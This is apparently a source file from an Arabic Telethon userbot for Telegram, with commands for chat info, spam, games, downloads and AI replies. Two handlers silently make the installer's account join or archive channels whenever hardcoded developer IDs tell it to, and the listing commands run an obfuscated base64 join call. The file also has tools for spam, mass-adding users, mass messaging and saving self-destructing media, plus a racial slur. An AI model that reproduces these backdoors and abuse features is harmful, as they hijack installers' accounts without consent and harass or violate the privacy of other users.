    if restrcited_users is not None:
        caption += f"الأعضاء المقيدون: <code>{restrcited_users}</code>\n"
    if banned_users is not None:
        caption += f"الأعضاء المحظورون: <code>{banned_users}</code>\n"
    if group_stickers is not None:
        caption += f"ملصقات {chat_type}: <a href=\"t.me/addstickers/{chat.full_chat.stickerset.short_name}\">{group_stickers}</a>\n"
    caption += "\n"
    if not broadcast:
        caption += f"الوضع البطيء: {slowmode}"
        if hasattr(chat_obj_info, "slowmode_enabled") and chat_obj_info.slowmode_enabled:
            caption += f", <code>{slowmode_time}s</code>\n\n"
        else:
            caption += "\n\n"
    if not broadcast:
        caption += f"مجموعة عملاقة: {supergroup}\n\n"
    if hasattr(chat_obj_info, "restricted"):
        caption += f"مقيد: {restricted}\n"
        if chat_obj_info.restricted:
            caption += f"> المنصة: {chat_obj_info.restriction_reason[0].platform}\n"
            caption += f"> السبب: {chat_obj_info.restriction_reason[0].reason}\n"
            caption += f"> النص: {chat_obj_info.restriction_reason[0].text}\n\n"
        else:
            caption += "\n"
    if hasattr(chat_obj_info, "scam") and chat_obj_info.scam:
    	caption += "احتيال: <b>نعم</b>\n\n"
    if hasattr(chat_obj_info, "verified"):
        caption += f"تم التحقق منه بواسطة Telegram: {verified}\n\n"
    if description:
        caption += f"الوصف: \n<code>{description}</code>\n"
    return caption
  
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.سبام$"))
async def spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  يجب الرد على رسالة نصية لاستخدام هذا الأمر.")

    text = message.text
    for char in text:
        await event.respond(char)
        await asyncio.sleep(0.8)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.وسبام$"))
async def word_spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return
    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  يجب الرد على رسالة نصية لاستخدام هذا الأمر.")

    words = message.text.split()
    for word in words:
        await event.respond(word)
        await asyncio.sleep(1)

from os import remove

auto_save_enabled = False

@client.on(events.NewMessage(outgoing=True, pattern=r'\.واو|\.حفظ الذاتية'))
async def rundrc(event):
    await event.delete()
    if event.pattern_match.group(0) == ".ذاتية":
        try:
            getrestrictedcontent = await event.get_reply_message()
            downloadrestrictedcontent = await getrestrictedcontent.download_media()
            await event.client.send_file("me", downloadrestrictedcontent)
            remove(downloadrestrictedcontent)
        except:
            pass
    elif event.pattern_match.group(0) == ".حفظ الذاتية":
        global auto_save_enabled
        auto_save_enabled = not auto_save_enabled
        if auto_save_enabled:
            await event.respond("تم تفعيل حفظ الوسائط ذاتية التدمير تلقائيًا.")
        else:
            await event.respond("تم إيقاف حفظ الوسائط ذاتية التدمير تلقائيًا.")

@client.on(events.NewMessage)
async def auto_save_media(event):
    if auto_save_enabled:
        try:
            if event.media and event.media.ttl_seconds:
                downloadrestrictedcontent = await event.download_media()
                await event.client.send_file("me", downloadrestrictedcontent)
                remove(downloadrestrictedcontent)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.خاص$"))
async def private_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎|يجب الرد على رسالة لاستخدام هذا الامر.**", parse_mode="md")

    chats = await finalll.get_dialogs()
    private_chats = [chat for chat in chats if chat.is_user]

    for chat in private_chats:
        try:
            if message.media:
                await finalll.send_file(chat.id, message.media, caption=message.text)
            else:
                await finalll.send_message(chat.id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {chat.id}: {e}")

@client.on(events.NewMessage(pattern=".تحويل نص ?(.*)"))
async def _(event):
    if event.fwd_from:
        return 
    if not event.reply_to_msg_id:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    reply_message = await event.get_reply_message() 
    if not reply_message.text:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    chat = "@QuotLyBot"
    sender = reply_message.sender
    if reply_message.sender.bot:
       await event.edit("⎙︙ يـجب. الرد علـى رسـالة الـمستخدم )")
       return
    await event.edit("⎙︙ جار تحويل النص الى ملصق")
    async with event.client.conversation(chat) as conv:
          try:     
              response = conv.wait_event(events.NewMessage(incoming=True,from_users=1031952739))
              await event.client.forward_messages(chat, reply_message)
              response = await response 
          except YouBlockedUserError: 
              await event.reply("```Please unblock me (@QuotLyBot) u Nigga```")
              return
          if response.text.startswith("Hi!"):
             await event.edit("⎙︙ يجـب الغاء خصـوصية التوجيـه اولا")
          else: 
             await event.delete()
             await event.client.send_message(event.chat_id, response.message)
             

@client.on(events.NewMessage(pattern=r".ضيف ?(.*)"))
async def get_users(event):   
    sender = await event.get_sender() ; me = await event.client.get_me()
    if not sender.id == me.id:
        roz = await event.reply("**▾∮ تتـم العـملية انتظـࢪ قليلا ⎙ ...**")
    else:
        roz = await event.edit("**▾∮ تتـم العـملية انتظـࢪ قليلا ⎙ ...**.")
    JoKeRUB = await get_chatinfo(event) ; chat = await event.get_chat()
    if event.is_private:
              return await roz.edit("**▾∮ لا يمكننـي اضافـة المـستخدمين هـنا**")    
    s = 0 ; f = 0 ; error = 'None'   
  
    await roz.edit("**▾∮ حـالة الأضافة:**\n\n**▾∮ تتـم جـمع معـلومات الـمستخدمين 🔄 ...⏣**")
    async for user in event.client.iter_participants(JoKeRUB.full_chat.id):
                try:
                    if error.startswith("Too"):
                        return await roz.edit(f"**حـالة الأضـافة انتـهت مـع الأخـطاء**\n- (**ربـما هـنالك ضغـط عـلى الأمࢪ حاول مججـدا لاحقـا 🧸**) \n**الـخطأ** : \n`{error}`\n\n• اضالـة `{s}` \n• خـطأ بأضافـة `{f}`"),
                    await event.client(functions.channels.InviteToChannelRequest(channel=chat,users=[user.id]))
                    s = s + 1                                                    
                    await roz.edit(f"**▾∮تتـم الأضـافة ⎙**\n\n• اضـيف `{s}` \n•  خـطأ بأضافـة `{f}` \n\n**× اخـر خـطأ:** `{error}`") 
                except Exception as e:
                    error = str(e) ; f = f + 1             
    return await roz.edit(f"**▾∮اڪتـملت الأضافـة ✅** \n\n• تـم بنجـاح اضافـة `{s}` \n• خـطأ بأضافـة `{f}`")

@client.on(events.NewMessage(pattern=r".اضافة_جهاتي ?(.*)"))
async def Hussein(event):
    channel_id = event.chat_id  
    contacts = await event.client(functions.contacts.GetContactsRequest(hash=0))
    added_count = 0 
    for user in contacts.users:
        try:
            await event.client(functions.channels.InviteToChannelRequest(
                channel=channel_id,
                users=[user.id],
            ))
            added_count += 1
        except Exception as e:
            await event.reply(f"**⎙︙ تم إضافة {added_count} من جهات اتصالي**")
    await event.reply(f"**⎙︙ تم إضافة {added_count} من جهات اتصالي**")
  
@client.on(events.NewMessage(outgoing=True, pattern=r"(.تاك_للكل|.all)(.*)"))
async def tagall(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    client.parse_mode = "html"
    message_text = event.pattern_match.group(2).strip()
    chat = await event.get_input_chat()
    me = await client.get_me()
    permissions = await client.get_permissions(chat, me)

    if not permissions.is_admin:
        await event.respond("عذرًا، لا أملك صلاحية ذكر الجميع في هذه المجموعة.")
        return

    all_participants = await client.get_participants(chat)
    hidden_members_found = False

    async def get_members():
        for user in all_participants:
            if not user.deleted:
                try:
                    participant = await client.get_entity(user.id)
                    if not (isinstance(participant, telethon.tl.types.ChannelParticipant) and participant.is_hidden):
                        yield user
                except ValueError:
                    pass

    
    temp_mentions = []  
    async for user in get_members():
        temp_mentions.append(f"<a href='tg://user?id={user.id}'>{user.first_name}</a>")
        
        if len(temp_mentions) == 20:  
            final_mentions = ""
            if message_text:
                final_mentions += f"<b>{message_text}</b>\n"
            final_mentions += " ".join(temp_mentions) + "\n\n"
            if hidden_members_found:
                final_mentions += "(لا يمكن ذكر الأعضاء المخفيين)\n"
            await client.send_message(chat, final_mentions, parse_mode="html")
            await asyncio.sleep(1)
            
            temp_mentions = []  

  
    if temp_mentions:  
        final_mentions = ""
        if message_text:
            final_mentions += f"<b>{message_text}</b>\n"
        final_mentions += " ".join(temp_mentions) + "\n\n"
        if hidden_members_found:
            final_mentions += "(لا يمكن ذكر الأعضاء المخفيين)\n"
        await client.send_message(chat, final_mentions, parse_mode="html")
        
    client.parse_mode = "markdown"  
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.انطق'))
async def runj(event):
    await event.delete()
    language = event.message.raw_text.split()
    getmessage = await event.get_reply_message()
    messagelocation = event.to_id
    filename = "FINAL-userbot.mp3"
    try:
        createtts = gTTS(text=f"{getmessage.message}", lang=f"{language[1]}", slow=False)
        createtts.save(filename)
        await client.send_file(messagelocation, filename)
        remove(filename)
    except:
        pass

@client.on(events.NewMessage(outgoing=True , pattern=r'\.عكس'))
async def rev(event):
	client = event.client
	if event.is_reply:
		replied = await event.get_reply_message()
		replied_msg_rev = replied.message[::-1]
		await client.edit_message(event.message, replied_msg_rev)

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]
        if joker_time > 0:
            await asyncio.sleep(joker_time)
        await event.mark_read()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.التكبر تعطيل$'))
async def Hussein(event):
    global aljoker_enabled
    aljoker_enabled = False
    await event.edit('**⎙︙ تم تعطيل امر التكبر بنجاح ✅**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.التكبر (\d+) (\d+)$'))
async def Hussein(event):
    global aljoker_enabled, JOKER_ID
    joker_time = int(event.pattern_match.group(1))
    user_id = int(event.pattern_match.group(2)) 
    JOKER_ID[user_id] = joker_time
    aljoker_enabled = True
    await event.edit(f'**⎙︙ تم تفعيل امر التكبر بنجاح مع  {joker_time} ثانية للمستخدم {user_id}**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.مود التكبر تعطيل$'))
async def Hussein(event):
    global hussein_enabled
    hussein_enabled = False
    await event.edit('**⎙︙ تم تعطيل امر التكبر على الجميع بنجاح ✅**')
    
@client.on(events.NewMessage(pattern=f".مود التكبر (\d+)"))
async def Hussein(event):
    global hussein_enabled, hussein_time
    hussein_time = int(event.pattern_match.group(1))
    hussein_enabled = True
    await event.edit(f'**⎙︙ تم تفعيل امر التكبر بنجاح مع  {hussein_time} ثانية**')

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def Hussein(event):
    global hussein_enabled, hussein_time
    if hussein_enabled:
        await asyncio.sleep(hussein_time)
        await event.mark_read()

# ================العاب ايفا=========================

R = [
    "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
    "  ❶ **⪼**  [حرب الفضاء 🛸](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ❷ **⪼**  [لعبة فلابي بيرد 🐥](https://t.me/awesomebot?game=FlappyBird)   \n"
    "  ❸ **⪼**  [القط المشاكس 🐱](https://t.me/gamee?game=CrazyCat)   \n"
    "  ❹ **⪼**  [صيد الاسماك 🐟](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ❺ **⪼**  [سباق الدراجات 🏍](https://t.me/gamee?game=MotoFX2)   \n"
    "  ❻ **⪼**  [سباق سيارات 🏎](https://t.me/gamee?game=F1Racer)   \n"
    "  ❼ **⪼**  [شطرنج ♟](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ❽ **⪼**  [كرة القدم ⚽](https://t.me/gamee?game=FootballStar)   \n"
    "  ❾ **⪼**  [كرة السلة 🏀](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ❿ **⪼**  [سلة 2 🎯](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ⓫ **⪼**  [ضرب الاسهم 🏹](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ⓬ **⪼**  [لعبة الالوان 🔵🔴](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ⓭ **⪼**  [كونج فو 🎽](https://t.me/gamee?game=KungFuInc)   \n"
    "  ⓮ **⪼**  [🐍 لعبة الافعى 🐍](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ⓯ **⪼**  [🚀 لعبة الصواريخ 🚀](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ⓰ **⪼**  [كيب اب 🧿](https://t.me/gamee?game=KeepitUP)   \n"
    "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
    "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
    "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** مطور السورس **⪼ [𐇮 𓂐 Извращенец 𖠛 ](t.me/X_54P)   \n"
    "**-** قناة السورس **⪼ [𐇮 𝐄𝐕𝐀 ](t.me/S21S6)   "
]

@client.on(events.NewMessage(pattern=".بلي$"))
async def ithker(knopis):
    await knopis.edit(random.choice(R))

#تضل تخمط من عمك الجوكر ؟ الى اين يستمُر الفشل ياغُلام
@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                response = "**⎙︙ تم الانضمام إلى القناة بنجاح!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**⎙︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                await l313l.edit_folder(channel_username, folder=1)
                response = "**⎙︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**⎙︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)

@client.on(events.NewMessage(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**⎙︙ لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"⎙︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
            continue
@client.on(events.NewMessage(pattern="(.تاريخه|تاريخة=)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        chat = await client.get_entity("@SangMata_beta_bot")
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)

@client.on(events.NewMessage(pattern=".حالتي ?(.*)"))
async def _(event):
    await event.edit("**- يتم التاكد من حالتك اذا كنت محظور او لا**")
    async with bot.conversation("@SpamBot") as conv:
        try:
            response = conv.wait_event(
                events.NewMessage(incoming=True, from_users=178220800)
            )
            await conv.send_message("/start")
            response = await response
            await bot.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("** اولا الغي حظر @SpamBot وحاول مجددا**")
            return
        await event.edit(f"- {response.message.message}\n @jepthon")


@client.on(events.NewMessage(pattern=".الاغنية ?(.*)"))
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await event.edit("**▾∮ يجب الرد على الاغنيه اولا**")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    try:
        async with event.client.conversation(chat) as conv:
            try:
                await event.edit("**▾∮ يتم التعرف على الاغنية انتظر**")
                start_msg = await conv.send_message("/start")
                response = await conv.get_response()
                send_audio = await conv.send_message(reply_message)
                check = await conv.get_response()
                if not check.text.startswith("Audio received"):
                    return await event.edit(
                        "**▾∮ يجب ان يكون حجم الاغنيه من 5 الى 10 ثواني **."
                    )
                await event.edit("- انتظر قليلا")
                result = await conv.get_response()
                await event.client.send_read_acknowledge(conv.chat_id)
            except YouBlockedUserError:
                await event.edit("```Mohon buka blokir (@auddbot) dan coba lagi```")
                return
            namem = f"**الأغنية : **{result.text.splitlines()[0]}\
        \n\n**التفاصيـل : **{result.text.splitlines()[2]}"
            await event.edit(namem)
            await event.client.delete_messages(
                conv.chat_id,
                [start_msg.id, send_audio.id, check.id, result.id, response.id],
            )
    except TimeoutError:
        return await event.edit("***حدث خطا ما حاول مجددا**")


@client.on(events.NewMessage(pattern=".ايميل وهمي(?: |$)(.*)"))
async def _(event):
    chat = "@TempMailBot"
    geez = await event.edit("**جاري انشاء بريد ...**")
    async with bot.conversation(chat) as conv:
        try:
            response = conv.wait_event(
                events.NewMessage(incoming=True, from_users=220112646)
            )
            await conv.send_message("/start")
            await asyncio.sleep(1)
            await conv.send_message("/create")
            response = await response
            l313lmail = (response).reply_markup.rows[2].buttons[0].url
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await geez.edit("**الغي حظر @TempMailBot  و حاول مجددا**")
            return
        await event.edit(
            f"الايميل الخاص هو `{response.message.message}`\n[ اضغط هنا لرؤية من رسائل الايميل الواردة]({l313lmail})"
        )
#السلام على الحسين وعلى الارواح التي حلت بفنائك ولعن الله قاتليك
@client.on(events.NewMessage(outgoing=True, pattern=".غنيلي$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/DwDi1/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : غنيلي ⎙",parse_mode="html")
  await joker313.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=".شعر$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/L1BBBL/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : شعر ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".الى متى$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/55/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : الى متى ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".احط رجلي$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/4/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : احط رجلي بطيزك ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".تبا$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/83/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : تبا لك ي شعلود ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".اكل خرا$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/86/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : اكل خرا ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".قران$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/QuraanJep/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : قران 🤲🏻☪️",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".عيب$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/i1Voices/1811/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : شعر ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(pattern=".ذكاء(.*)"))
async def handler(event):
    await event.edit("**⎙︙ جارِ الجواب على سؤالك انتظر قليلاً ...**")
    text = event.pattern_match.group(1).strip()
    if text:
        url = f'http://innova.shawrma.store/api/v1/gpt3?text={text}'
        response = requests.get(url).text
        await event.edit(response)
    else:
        await event.edit("يُرجى كتابة رسالة مع الأمر للحصول على إجابة.")
is_Reham = False
No_group_Joker = "@e_u0e"
# يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
active_aljoker = []

@client.on(events.NewMessage(pattern=".الذكاء تفعيل"))
async def enable_bot(event):
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_aljoker.append(event.chat_id)
        await event.edit("**⎙︙ تم تفعيل امر الذكاء الاصطناعي سيتم الرد على اسئلة الجميع عند الرد علي.**")
    else:
        await event.edit("**⎙︙ الزر مُفعّل بالفعل.**")
@client.on(events.NewMessage(pattern=".الذكاء تعطيل"))
async def disable_bot(event):
    global is_Reham
    if is_Reham:
        is_Reham = False
        active_aljoker.remove(event.chat_id)
        await event.edit("**⎙︙ تم تعطيل امر الذكاء الاصطناعي.**")
    else:
        await event.edit("**⎙︙ الزر مُعطّل بالفعل.**")
@client.on(events.NewMessage(incoming=True))
async def reply_to_hussein(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_aljoker:
        return
    message = event.message
    if message.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        if reply_message.sender_id == event.client.uid:
            text = message.text.strip()
            if event.chat.username == No_group_Joker:
                return
            response = requests.get(f'http://innova.shawrma.store/api/v1/gpt3?text={text}').text
            await asyncio.sleep(4)
            await event.reply(response)

@client.on(events.NewMessage(pattern=".تك"))
async def tiktok_dl(event):
    ms = event.message.message
    ms = ms.replace(".تك", "")
    if event:
            if ("https://tiktok.com/" in ms or "https://vm.tiktok.com/" in ms):
                await event.message.delete()
                a = await l313l.send_message(event.chat_id, 'يجري البحث عن الملف..')
                link = ms.strip()
                try:
                    response = requests.get(f"https://godownloader.com/api/tiktok-no-watermark-free?url={link}&key=godownloader.com")
                    data = response.json()
                    #print(data)
                    video_link = data["video_no_watermark"]
                    response = requests.get(video_link)
                    video_data = response.content
                    directory = str(round(time.time()))
                    filename = str(int(time.time()))+'.mp4'
                    os.mkdir(directory)
                    video_filename = f"{directory}/{filename}"
                    with open(video_filename, "wb") as file:
                        file.write(video_data)
                
                except JSONDecodeError:
                    return await a.edit("الرابط غير صحيح تأكد منه!")
                except Exception as er:
                    if 'video_no_watermark' in str(er):
                        return await a.edit("**رابط الفيديو غير صحيح تأكد منه واعد المحاولة**")
                    return await a.edit(f"حدث خطأ قم بتوجيه الرسالة الى مطوري @X_54P\n{er}")
            
            
                
                await a.edit(f' يجري التحميل للخادم..!\n'
                   f' يجري الرفع للتلجرام⏳__')
                start = time.time()
                title = "فيديو"
                filesize_bytes = os.path.getsize(video_filename)
                filesize = filesize_bytes / (1024 * 1024)
                catid = await reply_id(event.message)
                await l313l.send_file(
                   event.chat_id, f"{directory}/{filename}", reply_to=catid,     force_document=False,     caption=f"**الملف : ** {filename}\n**الحجم :**     {round(filesize, 1)} MB"
                 )
        
                await a.delete()
     
                shutil.rmtree(directory)
    #else:
       # return None
       

@client.on(events.NewMessage(outgoing=True, pattern=".لوكي شدخلك$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/382/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : شدخلك ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".يعني هل خره$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/381/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : خره ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(pattern=".قائمه (جميع القنوات|القنوات المشرف عليها|قنواتي)"))
async def ViewChJok(event):
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            channel_name = entity.title
            channel_id = entity.id
            is_owner = entity.creator
            is_admin = entity.admin_rights
            if entity.username:
                if entity.megagroup:
                    channel_link = f"{channel_name} ({entity.username})"
                else:
                    channel_link = f"[{channel_name}](https://t.me/{entity.username})"
            else:
                if entity.megagroup:
                    channel_link = f"{channel_name}"
                else:
                    channel_link = f"[{channel_name}](https://t.me/c/{channel_id}/1)"
            if is_owner:
                hico.append(channel_link)
            if is_admin:
                hica.append(channel_link)
            if not is_owner and not is_admin:
                hi.append(channel_link)
    if catcmd == "جميع القنوات":
        output = CHANNELS_STR
        for k, channel in enumerate(hi, start=1):
            output += f"{k}• {channel}\n"
    elif catcmd == "القنوات المشرف عليها":
        output = CHANNELS_ADMINSTR
        for k, channel in enumerate(hica, start=1):
            output += f"{k}• {channel}\n"
    elif catcmd == "قنواتي":
        output = CHANNELS_OWNERSTR
        for k, channel in enumerate(hico, start=1):
            output += f"{k}• {channel}\n"
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n\n**استغرق حساب القنوات: **{stop_time:.02f} ثانية"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(catevent, output)

async def edit_or_reply(event, text, buttons=None):
    if buttons is None:
        buttons = []
    if event.edit_date is None:
        return await event.reply(text, buttons=buttons)
    else:
        return await event.edit(text, buttons=buttons)
        
@client.on(events.NewMessage(pattern=".قائمه (جميع المجموعات|مجموعات اديرها|كروباتي)$"))
async def stats(event):  # sourcery no-metrics
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "جميع المجموعات":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "مجموعات اديرها":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "كروباتي":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب المجموعات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )
STAT_INDICATION = "**⎙︙ جـاري جـمـع الإحصـائيـات انتـظـر ⏱ **"
CHANNELS_STR = "**⎙︙ قائمة القنوات التي أنت فيها موجودة هنا\n\n"
CHANNELS_ADMINSTR = "**⎙︙ قائمة القنوات التي انت مشـرف بهـا **\n\n"
CHANNELS_OWNERSTR = "**⎙︙ قائمة القنوات التي تـكون انت مالكـها**\n\n"
GROUPS_STR = "**⎙︙ قائمة المجموعات التي أنت فيها موجود فيـها**\n\n"
GROUPS_ADMINSTR = "**⎙︙ قائمة المجموعات التي تكون مشـرف بهـا**\n\n"
GROUPS_OWNERSTR = "**⎙︙ قائمة المجموعات التي تـكون انت مالكـها**\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r'\.اسرع (.*)'))
async def handle_start(event):
    global is_game_started, is_word_sent, word, bot_entity
    is_game_started = True
    is_word_sent = False
    word = event.pattern_match.group(1)
    chat_id = event.chat_id
    await event.edit(f"**اول من يكتب ( {word} ) سيفوز**")

joker = [
    "تلعب وخوش تلعب ",
    "لك عاش يابطل استمر ",
    "على كيفك ركزززز انتَ كدها ",
    "لك وعلي ذيييب ",
]

correct_answer = None
game_board = [["" for _ in range(6)] for _ in range(1)]
numbers_board = [["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣"]]
original_game_board = [["" for _ in range(6)] for _ in range(1)]
joker_player = None
is_game_started2 = False
group_game_status = {}
points = {}

async def handle_clue(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id not in group_game_status or not group_game_status[chat_id]:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if not group_game_status[chat_id]['is_game_started2']:
        group_game_status[chat_id]['is_game_started2'] = True
        group_game_status[chat_id]['joker_player'] = None
        correct_answer = random.randint(1, 6)
